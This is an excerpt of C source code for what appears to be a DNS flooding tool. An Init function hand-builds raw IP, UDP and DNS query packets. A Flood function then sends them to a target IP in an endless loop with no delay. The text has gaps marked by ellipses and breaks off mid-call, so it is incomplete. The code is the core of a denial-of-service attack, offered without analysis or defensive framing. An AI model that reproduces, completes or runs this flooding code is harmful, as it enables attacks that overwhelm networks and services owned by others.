...
void Init(char *buffer, int buffer_size, char *ip, char *base_name)
{
	...
	PaddingQuery(udp_packet + sizeof(UsdHeader) + sizeof(UdpHeader) + sizeof(DnsHeader),
		     base_name);

	memcpy(udp_packet + sizeof(UsdHeader) + sizeof(UdpHeader) + sizeof(DnsHeader) + 1 +
	       HOST_LENGTH + strlen(base_name) + 1, ((char *)&QueryHeader) + sizeof(char *),
	       sizeof(QueryHeader) - sizeof(char *));

	UdpHeader.uh_checksum = CheckSum((unsigned short *)udp_packet, udp_with_usd_len);
	memcpy(udp_packet + sizeof(UsdHeader), &UdpHeader, sizeof(UdpHeader));

	memcpy(buffer + sizeof(IpHeader), udp_packet + sizeof(UsdHeader),
	       udp_with_usd_len - sizeof(USD_HEADER));
...
void Flood(char *dst_ip, char *base_name)
{
	...
	int total_packet_len =
	    sizeof(IP_HEADER) + sizeof(UDP_HEADER) + sizeof(DNS_HEADER) + sizeof(QUERY_HEADER) +
	    strlen(base_name) + HOST_LENGTH + 2 - sizeof(char *);
	...
	if (sleeptime == 0) {
		while (1) {
			...
			sendto(sock, buffer, total_packet_len, 0, (struct sockaddr *)&sa,
